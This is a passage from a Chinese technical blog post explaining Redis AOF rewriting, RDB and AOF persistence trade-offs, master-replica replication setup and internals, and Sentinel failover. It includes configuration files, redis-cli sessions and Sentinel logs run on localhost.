只保留可以恢复数据的最小指令集。可以手动执行<code>bgrewriteaof</code>命令进行重写。</p><p><strong>重写原理：</strong></p><ul><li><p>AOF文件持续增长而过大时，会fork出一个新进程来将文件重写（也是先写临时文件最后再rename）</p><ul><li>redis4.0版本后的重写是把rdb 的快照，以二级制的形式附在新的aof头部，作为已有的历史数据，替换掉原来的流水账操作。对应配置文件中的：<code>aof-use-rdb-preamble yes</code></li></ul></li><li><p>如果配置文件中 <code>no-appendfsync-on-rewrite yes</code> ，表示不写入aof文件只写入缓存，用户请求不会阻塞，但是在这段时间如果宕机会丢失这段时间的缓存数据。（降低数据安全性，提高性能）</p></li><li><p>如果配置文件中<code>no-appendfsync-on-rewrite no</code>，则会写入aof文件，往磁盘存储，但是遇到重写操作，可能会发生阻塞。（数据安全，但是性能降低）</p></li></ul><p> <strong>重写流程：</strong></p><ol><li><p><code>bgrewriteaof</code>触发重写，判断当前是否有<code>bgsave</code>或<code>bgrewriteaof</code>在运行，如果有则等待该命令结束后再继续执行。</p></li><li><p>主进程fork出子进程执行重写操作，保证主进程不会阻塞。</p></li><li><p>子进程遍历redis内存中数据到临时文件，客户端的写请求<strong>同时写入</strong>aof_buf缓冲区和aof_rewrite_buf重写缓冲区，保证原AOF文件完整以及新AOF文件生成期间的新的数据修改动作不会丢失。</p></li><li><p>子进程写完新的AOF文件后，向主进程发信号，父进程更新统计信息。主进程把aof_rewrite_buf中的数据写入到新的AOF文件。</p></li><li><p>使用新的AOF文件覆盖旧的AOF文件，完成AOF重写。即使<code>bgrewriteaof</code>执行失败，也不会有任何数据丢失，因为旧的 AOF 文件在 Bgrewriteaof 成功之前不会被修改。</p></li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220215001207.png"></p><p><strong>重写触发机制：</strong></p><p>重写虽然可以节约大量磁盘空间，减少恢复时间。但是每次重写还是有一定的负担的，因此设定Redis要满足一定条件才会进行重写。 </p><ul><li><p>Redis会记录上次重写时的AOF文件大小，默认配置是当AOF文件大小是上次rewrite后大小的一倍<strong>且</strong>文件大于64M时触发。</p></li><li><p><code>auto-aof-rewrite-percentage</code>：设置重写的基准值，文件达到100%时开始重写（现在文件是原来重写后文件的2倍时触发）</p></li><li><p><code>auto-aof-rewrite-min-size</code>：设置重写的基准值，最小文件64MB。达到这个值开始重写。</p></li><li><p>例如文件达到70MB开始重写，降到50MB，下次什么时候开始重写？100MB</p></li><li><p>系统载入时或者上次重写完毕时，Redis会记录此时AOF大小，设为base_size，如果Redis的AOF文件当前大小&gt;&#x3D; base_size +base_size*100% (默认)<strong>且</strong>当前大小&gt;&#x3D;64mb(默认)的情况下，Redis会对AOF进行重写。</p></li></ul><h3 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li><p>优点：</p><ul><li>备份机制更稳健，丢失数据概率更低。</li><li>可读的日志文本，通过操作AOF稳健，可以处理失误操作。</li></ul></li><li><p>缺点：</p><ul><li>比起RDB占用更多的磁盘空间。</li><li>恢复备份速度要慢。</li><li>每次读写都同步的话，有一定的性能压力。</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>Redis默认持久化策略是RDB</p></li><li><p>AOF默认不开启</p></li><li><p>AOF和RDB同时开启，系统默认加载AOF的数据</p></li><li><p>如果对数据不敏感，可以选单独用RDB</p></li><li><p>不建议单独用 AOF，因为可能会出现Bug</p></li><li><p>如果只是做纯内存缓存，可以都不用</p></li></ul><p><strong>官网建议：</strong></p><ul><li><p>RDB持久化方式能够在指定的时间间隔能对你的数据进行快照存储</p></li><li><p>AOF持久化方式记录每次对服务器写的操作，当服务器重启的时候会重新执行这些命令来恢复原始的数据，AOF命令以<strong>redis协议</strong>追加保存每次写的操作到文件末尾</p></li><li><p>Redis还能对AOF文件进行后台重写，使得AOF文件的体积不至于过大</p></li><li><p>只做缓存：如果你只希望你的数据在服务器运行的时候存在，你也可以不使用任何持久化方式</p></li><li><p>同时开启两种持久化方式：</p><ul><li>当redis重启的时候会优先载入AOF文件来恢复原始的数据，因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整。同时使用两者时服务器重启也只会找AOF文件。</li><li>建议不要只使用AOF，因为RDB更适合用于备份数据库(AOF在不断变化不好备份)， 快速重启，而且不会有AOF可能潜在的bug，留着作为一个万一的手段。</li></ul></li></ul><h1 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Redis主从复制（master&#x2F;slaver机制），是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)，数据的复制是单向的，只能由主节点到从节点。Master以写为主，Slave以读为主。</p><p>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p><p><strong>作用：</strong></p><ol><li><p>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</p></li><li><p>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</p></li><li><p>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</p></li><li><p>读写分离：可以用于实现读写分离，主库写、从库读，读写分离不仅可以提高服务器的负载能力，同时可根据需求的变化，改变从库的数量；</p></li><li><p>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</p></li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220215223044.png"></p><h2 id="搭建一主多从"><a href="#搭建一主多从" class="headerlink" title="搭建一主多从"></a>搭建一主多从</h2><p>（1）创建&#x2F;myredis文件夹：<code>mkdir /myredis</code></p><p>（2）复制redis.conf配置文件到文件夹中：<code>cp /opt/redis-6.2.6/redis.conf /myredis/</code></p><p>（3）创建三个配置文件并进行如下配置：</p><p>redis6379.conf：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include /myredis/redis.conf</span><br><span class="line">pidfile /var/run/redis_6379.pid</span><br><span class="line">port 6379</span><br><span class="line">dbfilename dump6379.rdb</span><br><span class="line">daemonize yes</span><br><span class="line">appendonly no</span><br></pre></td></tr></table></figure><p>redis6380.conf：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include /myredis/redis.conf</span><br><span class="line">pidfile /var/run/redis_6380.pid</span><br><span class="line">port 6380</span><br><span class="line">dbfilename dump6380.rdb</span><br><span class="line">daemonize yes</span><br><span class="line">appendonly no</span><br></pre></td></tr></table></figure><p>redis6381.conf：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include /myredis/redis.conf</span><br><span class="line">pidfile /var/run/redis_6381.pid</span><br><span class="line">port 6381</span><br><span class="line">dbfilename dump6381.rdb</span><br><span class="line">daemonize yes</span><br><span class="line">appendonly no</span><br></pre></td></tr></table></figure><p>（4）启动三个redis服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myredis]# redis-server redis6379.conf </span><br><span class="line">[root@nanzx myredis]# redis-server redis6380.conf </span><br><span class="line">[root@nanzx myredis]# redis-server redis6381.conf </span><br></pre></td></tr></table></figure><p>（5）查看系统进程，看看三台服务器是否启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myredis]# ps -ef|grep redis</span><br><span class="line">root      83477      1  0 22:50 ?        00:00:00 redis-server *:6380</span><br><span class="line">root      83490      1  0 22:52 ?        00:00:00 redis-server *:6379</span><br><span class="line">root      83501      1  0 22:52 ?        00:00:00 redis-server *:6381</span><br><span class="line">root      83507  83426  0 22:52 pts/0    00:00:00 grep --color=auto redis</span><br></pre></td></tr></table></figure><p>（6）查看三台主机运行情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myredis]# redis-cli -p 6379</span><br><span class="line">127.0.0.1:6379&gt; info replication</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:dca7c4a6677d7db6d409eec75cb489af07eeb610</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:0</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:0</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:0</span><br><span class="line">repl_backlog_histlen:0</span><br></pre></td></tr></table></figure><p>（7）配从(节点)**不配主(节点)**，在6380和6381上执行: <code>slaveof 127.0.0.1 6379</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myredis]# redis-cli -p 6381</span><br><span class="line">127.0.0.1:6381&gt; slaveof 127.0.0.1 6379</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6381&gt; info replication</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Replication</span></span><br><span class="line">role:slave</span><br><span class="line">master_host:127.0.0.1</span><br><span class="line">master_port:6379</span><br><span class="line">master_link_status:up</span><br><span class="line">master_last_io_seconds_ago:6</span><br><span class="line">master_sync_in_progress:0</span><br><span class="line">slave_read_repl_offset:42</span><br><span class="line">slave_repl_offset:42</span><br><span class="line">slave_priority:100</span><br><span class="line">slave_read_only:1</span><br><span class="line">replica_announced:1</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:877005c9ff59e7d6156934a911a3f0a01246002d</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:42</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:29</span><br><span class="line">repl_backlog_histlen:14</span><br><span class="line"></span><br><span class="line">[root@nanzx myredis]# redis-cli -p 6379</span><br><span class="line">127.0.0.1:6379&gt; info replication</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:2</span><br><span class="line">slave0:ip=127.0.0.1,port=6380,state=online,offset=154,lag=0</span><br><span class="line">slave1:ip=127.0.0.1,port=6381,state=online,offset=154,lag=1</span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:877005c9ff59e7d6156934a911a3f0a01246002d</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:154</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:1</span><br><span class="line">repl_backlog_histlen:154</span><br></pre></td></tr></table></figure><p>（8）在主机上写，在从机上可以读取数据，在从机上写数据报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set k1 v1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; exit</span><br><span class="line">[root@nanzx myredis]# redis-cli -p 6380</span><br><span class="line">127.0.0.1:6380&gt; get k1</span><br><span class="line">&quot;v1&quot;</span><br><span class="line">127.0.0.1:6380&gt; set k2 v2</span><br><span class="line">(error) READONLY You can&#x27;t write against a read only replica.</span><br></pre></td></tr></table></figure><p>（9）主节点挂掉重启就行，一切如初。从节点重启需重设：<code>slaveof 127.0.0.1 6379</code>，可以将这个命令配置到文件中，永久生效。也可在redis-server启动命令后加入 <code>--slaveof &lt;masterip&gt; &lt;masterport&gt;</code></p><p>（10）断开与主节点复制关系：<code>slaveof no one</code>，从节点断开复制后不会删除原有数据，只是无法再获取主节点上的数据变化。</p><p>（11）切主操作：<code>slaveof &lt;masterip&gt; &lt;masterport&gt;</code>，从节点断开与旧主节点复制关系，与新主节点建立复制关系，<strong>删除从节点当前所有数据</strong>，对新主节点进行复制操作。</p><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><strong>一主一从：</strong></p><ul><li>主要用于主节点出现宕机时从节点提供故障转移支持</li><li>当应用写命令并发量高且需要持久化时，可以只在从节点上开启AOF，这样可以保证数据安全性以及避免持久化对主节点的性能干扰。</li><li>主节点要避免自动重启操作，因为没有开启持久化自动重启后数据集为空，从节点继续复制也被清空数据。安全做法是从节点执行<code>slaveof no one</code>，再重启主节点。</li></ul><p><strong>一主多从：</strong></p><ul><li>主要用于读占较大的场景，利用多个从节点实现读写分离来分担主节点压力，主写从读</li><li>多个从节点会导致主节点写命令的多次发送从而过度消耗网络带宽，同时加重主节点的负载影响服务稳定性</li></ul><p><strong>树状主从结构：</strong></p><ul><li>从节点不但可以复制主节点数据，同时可以作为其他从节点的主节点继续向下层复制</li><li>通过引入复制中间层可以有效降低主节点负载和需要传送给从节点的数据量</li></ul><h2 id="复制原理"><a href="#复制原理" class="headerlink" title="复制原理"></a>复制原理</h2><p>主从复制的具体步骤如下：</p><p>（1）slave服务器连接到master服务器，便开始进行数据同步，发送psync命令（Redis2.8之前是sync命令）</p><p>（2）master服务器收到psync命令之后，开始执行bgsave命令生成RDB快照文件并使用缓存区记录此后执行的所有写命令（<strong>全量复制</strong>）<br>（3）master服务器bgsave执行完之后，就会向所有slava服务器发送快照文件，并在发送期间继续在缓冲区内记录被执行的写命令</p><p>（4）slave服务器收到RDB快照文件后，会将接收到的数据写入磁盘，然后清空所有旧数据，再从本地磁盘载入收到的快照到内存中，同时基于旧的数据版本对外提供服务。</p><p>（5）master服务器发送完RDB快照文件之后，便开始向slave服务器发送缓冲区中的写命令（<strong>增量复制</strong>）</p><p>（6）slave服务器完成对快照的载入，开始接收命令请求，并执行来自主服务器缓冲区的写命令；</p><p>（7）如果slave node开启了AOF，那么会立即执行BGREWRITEAOF，重写AOF</p><h1 id="哨兵模式（Sentinel）"><a href="#哨兵模式（Sentinel）" class="headerlink" title="哨兵模式（Sentinel）"></a>哨兵模式（Sentinel）</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>主从复制的缺陷：</p><ol><li><p>一旦主节点出现故障，需要人工手动将从节点晋升为主节点，同时需要修改应用方的主节点地址，还需要命令其他从节点去复制新的主节点。（Redis高可用问题）</p></li><li><p>主节点的写能力和存储能力受到单机的限制。（Redis分布式问题）</p></li></ol><p><strong>哨兵模式</strong>是一个分布式架构，能自动完成故障发现和故障转移，解决主从复制的高可用问题，其中包含<strong>多个</strong>哨兵节点（Sentinel节点，不存储数据，只支持部分命令）和Redis数据节点（主节点和从节点）。</p><p><strong>哨兵节点具体有以下几个功能：</strong></p><ul><li>监控：哨兵节点会定期检测Redis数据节点和其他哨兵节点是否可达</li><li>通知：哨兵节点会将故障转移的结果通知给应用方</li><li>主节点故障转移：实现从节点晋升为主节点并维护后续正确的主从关系</li><li>配置提供者：在哨兵模式中，客户端在初始化的时候连接的是哨兵节点集合，从中获取主节点信息<ul><li>哨兵节点集合是多个哨兵节点组成，对故障的判断是集合里的节点共同完成，防止误判，同时个别节点不可用，依旧有健壮性。</li></ul></li></ul><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>实现原理主要包括：三个定时任务、主观下线和客观下线、Sentinel领导者选举、故障转移。</p><p><strong>三个定时任务：</strong></p><ul><li>每隔10秒，每个哨兵节点会向主节点和从节点发送info命令获取最新的拓扑结构。这个定时任务的作用具体可以表现在三个方面：<ul><li>通过向主节点执行info命令，获取从节点的信息，这也是为什么哨兵节点不需要显式配置监控从节点。</li><li>当有新的从节点加入时都可以立刻感知出来。</li><li>节点不可达或者故障转移后，可以通过info命令实时更新节点拓扑信息。</li></ul></li><li>每隔2秒，每个哨兵节点会向Redis数据节点的<code>_sentinel_:he11o</code>频道上发送该哨兵节点对于主节点的判断以<br>及当前哨兵节点的信息，同时每个哨兵节点也会订阅该频道，来了解其他哨兵节点以及它们对主节点的判断，所以这个定时任务可以完成以下两个工作：<ul><li>发现新的哨兵节点：通过订阅主节点的<code>_sentinel_:hello</code>了解其他的哨兵节点信息，如果是新加入的哨兵节点，将该哨兵节点信息保存起来，并与该哨兵节点创建连接。</li><li>哨兵节点之间交换主节点的状态，作为后面客观下线以及领导者选举的依据。</li></ul></li><li>每隔1秒，每个哨兵节点会向主节点、从节点、其余哨兵节点发送一条ping命令做一次心跳检测，来确认这些节点当前是否可达。通过上面的定时任务，哨兵节点对主节点、从节点、其余哨兵节点都建立起连接，实现了对每个节点的监控，这个定时任务是节点失败判定的重要依据。</li></ul><p><strong>主观下线：</strong></p><p>第三个定时任务，每个哨兵节点会每隔1秒对主节点、从节点、其他哨兵节点发送ping命令做心跳检测，当这些节点超过<code>down-after-milliseconds</code>没有进行有效回复，哨兵节点就会对该节点做失败判定，这个行为叫做主观下线。从字面意思也可以很容易看出主观下线是当前哨兵节点的一家之言，存在误判的可能。</p><p><strong>客观下线：</strong></p><p>当哨兵主观下线的节点是主节点时，该哨兵节点会通过<code>sentinelis-master-down-by-addr</code>命令向其他哨兵节点询问对主节点的判断，当超过&lt; quorum &gt;个数，哨兵节点认为主节点确实有问题，这时该哨兵节点会做出客观下线的决定，这样客观下线的含义是比较明显了，也就是大部分哨兵节点都对主节点的下线做了同意的判定，那么这个判定就是客观的。</p><blockquote><p>&lt; quorum &gt;代表判断主节点失败至少需要多少个哨兵节点同意</p></blockquote><p><strong>Sentinel领导者选举：</strong></p><p>故障转移的工作只需要一个哨兵节点来完成即可，所以哨兵节点之间会做一个领导者选举的工作，选出一个哨兵节点作为领导者进行故障转移的工作。Redis使用了Rat算法实现领导者选举，因为Raft算法相对比较抽象和复杂，以及篇幅所限，所以这里给出一个Redis Sentinel进行领导者选举的大致思路：</p><ol><li>每个在线的哨兵节点都有资格成为领导者，当它确认主节点客观下线时候，会向其他哨兵节点发送<code>sentinel is-master-down-by-addr</code>命令，要求将自己设置为领导者。</li><li>收到命令的哨兵节点，如果没有同意过其他哨兵节点的<code>sentinelis-master-down-by-addr</code>命令，将同意该请求，否则拒绝。</li><li>如果该哨兵节点发现自己的票数已经大于等于<code>max(quorum，num(sentinels)/2+1)</code>，那么它将成为领导者。</li></ol><p><strong>故障转移：</strong></p><ul><li>在从节点列表中选出一个节点作为新的主节点，选择方法如下：<ul><li>过滤：“不健康”（主观下线、断线）、5秒内没有回复过哨兵节点ping响应、与主节点失联超过down-<br>after-milliseconds*10秒。</li><li>选择slave-priority（从节点优先级，值越小优先级越高），最高的从节点列表，如果存在则返回，不存在则继续。</li><li>选择复制偏移量最大的从节点（复制的最完整），如果存在则返回，不存在则继续。</li><li>选择runid最小的从节点。</li></ul></li><li>哨兵领导者节点会对第一步选出来的从节点执行slaveof no one命令让其成为主节点。</li><li>哨兵领导者节点会向剩余的从节点发送命令，让它们成为新主节点的从节点，复制规则和paralle1-syncs参数有关。</li><li>哨兵节点集合会将原来的主节点更新为从节点，并保持着对其关注，当其恢复后命令它去复制新的主节点。</li></ul><h2 id="部署哨兵节点"><a href="#部署哨兵节点" class="headerlink" title="部署哨兵节点"></a>部署哨兵节点</h2><p>在一主多从的模式下部署一个哨兵节点模拟：</p><p>（1）自定义的&#x2F;myredis目录下新建sentinel.conf文件(名字绝不能错)，填写内容：<code>sentinel monitor mymaster 127.0.0.1 6379 1</code></p><p>其中mymaster为监控对象起的服务器名称， 1 为至少有多少个哨兵同意迁移的数量。</p><p>（2）启动哨兵节点：<code>redis-sentinel  /myredis/sentinel.conf </code>。端口号是26379</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myredis]# redis-sentinel /myredis/sentinel.conf </span><br><span class="line">118302:X 20 Feb 2022 13:21:26.631 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.631 # Redis version=6.2.6, bits=64, commit=00000000, modified=0, pid=118302, just started</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.631 # Configuration loaded</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.633 * Increased maximum number of open files to 10032 (it was originally set to 1024).</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.633 * monotonic clock: POSIX clock_gettime</span><br><span class="line">                _._                                                  </span><br><span class="line">           _.-``__ &#x27;&#x27;-._                                             </span><br><span class="line">      _.-``    `.  `_.  &#x27;&#x27;-._           Redis 6.2.6 (00000000/0) 64 bit</span><br><span class="line">  .-`` .-```.  ```\/    _.,_ &#x27;&#x27;-._                                  </span><br><span class="line"> (    &#x27;      ,       .-`  | `,    )     Running in sentinel mode</span><br><span class="line"> |`-._`-...-` __...-.``-._|&#x27;` _.-&#x27;|     Port: 26379</span><br><span class="line"> |    `-._   `._    /     _.-&#x27;    |     PID: 118302</span><br><span class="line">  `-._    `-._  `-./  _.-&#x27;    _.-&#x27;                                   </span><br><span class="line"> |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|                                  </span><br><span class="line"> |    `-._`-._        _.-&#x27;_.-&#x27;    |           https://redis.io       </span><br><span class="line">  `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;                                   </span><br><span class="line"> |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|                                  </span><br><span class="line"> |    `-._`-._        _.-&#x27;_.-&#x27;    |                                  </span><br><span class="line">  `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;                                   </span><br><span class="line">      `-._    `-.__.-&#x27;    _.-&#x27;                                       </span><br><span class="line">          `-._        _.-&#x27;                                           </span><br><span class="line">              `-.__.-&#x27;                                               </span><br><span class="line"></span><br><span class="line">118302:X 20 Feb 2022 13:21:26.636 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.642 # Sentinel ID is c63f36aa0c006c36e4443a5b7af0937a9cd83f3a</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.642 # +monitor master mymaster 127.0.0.1 6379 quorum 1</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.644 * +slave slave 127.0.0.1:6380 127.0.0.1 6380 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 13:21:26.647 * +slave slave 127.0.0.1:6381 127.0.0.1 6381 @ mymaster 127.0.0.1 6379</span><br></pre></td></tr></table></figure><p>（3）将主节点关闭，过了二十多秒哨兵节点会重新选举主节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">118302:X 20 Feb 2022 14:28:31.612 # +sdown master mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.612 # +odown master mymaster 127.0.0.1 6379 #quorum 1/1</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.612 # +new-epoch 1</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.612 # +try-failover master mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.616 # +vote-for-leader c63f36aa0c006c36e4443a5b7af0937a9cd83f3a 1</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.616 # +elected-leader master mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.616 # +failover-state-select-slave master mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.684 # +selected-slave slave 127.0.0.1:6381 127.0.0.1 6381 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.684 * +failover-state-send-slaveof-noone slave 127.0.0.1:6381 127.0.0.1 6381 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:31.756 * +failover-state-wait-promotion slave 127.0.0.1:6381 127.0.0.1 6381 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:32.308 # +promoted-slave slave 127.0.0.1:6381 127.0.0.1 6381 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:32.308 # +failover-state-reconf-slaves master mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:32.366 * +slave-reconf-sent slave 127.0.0.1:6380 127.0.0.1 6380 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:33.318 * +slave-reconf-inprog slave 127.0.0.1:6380 127.0.0.1 6380 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:33.318 * +slave-reconf-done slave 127.0.0.1:6380 127.0.0.1 6380 @ mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:33.402 # +failover-end master mymaster 127.0.0.1 6379</span><br><span class="line">118302:X 20 Feb 2022 14:28:33.402 # +switch-master mymaster 127.0.0.1 6379 127.0.0.1 6381</span><br><span class="line">118302:X 20 Feb 2022 14:28:33.402 * +slave slave 127.0.0.1:6380 127.0.0.1 6380 @ mymaster 127.0.0.1 6381</span><br><span class="line">118302:X 20 Feb 2022 14:28:33.402 * +slave slave 127.0.0.1:6379 127.0.0.1 6379 @ mymaster 127.0.0.1 6381</span><br><span class="line">118302:X 20 Feb 2022 14:29:03.432 # +sdown slave 127.0.0.1:6379 127.0.0.1 6379 @ mymaster 127.0.0.1 6381</span><br></pre></td></tr></table></figure><p>（4）将关闭的“主节点”重启，它将变为从节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">118302:X 20 Feb 2022 14:42:58.822 * +convert-to-slave slave 127.0.0.1:6379 127.0.0.1 6379 @ mymaster 127.0.0.1 6381</span><br></pre></td></tr></table></figure><h1 id="Redis集群（Cluster）"><a href="#Redis集群（Cluster）" class="headerlink" title="Redis集群（Cluster）"></a>Redis集群（Cluster）</h1><blockquote><p>详解可参考：<a href="https://blog.csdn.net/miss1181248983/article/details/90056960/">Redis集群详解</a></p></blockquote><h2 id="简介-3"><a href="#简介-3" class="headerlink" 